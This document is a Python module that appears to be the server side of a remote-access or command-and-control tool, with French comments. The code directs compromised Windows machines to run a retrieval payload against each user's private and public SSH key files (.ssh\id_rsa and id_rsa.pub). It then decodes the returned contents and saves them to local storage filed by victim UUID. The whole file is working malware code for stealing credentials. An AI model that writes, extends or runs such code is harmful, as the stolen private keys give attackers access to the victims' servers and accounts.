import asyncio
import base64
import logging
import os
import re

from dataManager.repository.userRepository import UserRepository


class SensitiveFilesModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "sensitive_files_module"
        self.user_repository: UserRepository = user_repository

    async def retrieve(self, uuid):
        user = self.user_repository.get_user(uuid)

        if not user:
            logging.error(f"User with uuid {uuid} not found")
            return
        logging.info(f"Retrieving sensitive files of {uuid}")
        tasks = []
        path_list = [
            f"C:\\Users\\{user.username}\\.ssh\\id_rsa",
            f"C:\\Users\\{user.username}\\.ssh\\id_rsa.pub",
        ]

        for path in path_list:
            tasks.append(SensitiveFilesModule.retrieve_file(path, user))
        await asyncio.gather(*tasks)

        return {
            "status": "success",
            "message": f"Sensitive files of {uuid} retrieved"
        }

    @staticmethod
    async def retrieve_file(path, user):
        res = await user.execute(
            "./modules/payloads/payload_retrieve_sensitive_files.py",
            {
              b"PATH_PLACEHOLDER": path.encode(),
            })

        print(res)

        if res == "File not found":
            return

        createDir = os.path.join(os.getenv('STORAGE_PATH'), 'users', user.uuid)

        if not os.path.exists(createDir):
            os.makedirs(createDir)

        # Nettoyez le nom de fichier en supprimant les caractères non valides
        safe_path = re.sub(r'[<>:"/\\|?*]', "_", path)
        file_path = os.path.join(createDir, safe_path)

        # Décodage du contenu base64 et écriture dans le fichier
        decoded = base64.b64decode(res)  # Assurez-vous d'utiliser b64decode pour décoder le contenu
        with open(file_path, "wb") as f:
            f.write(decoded)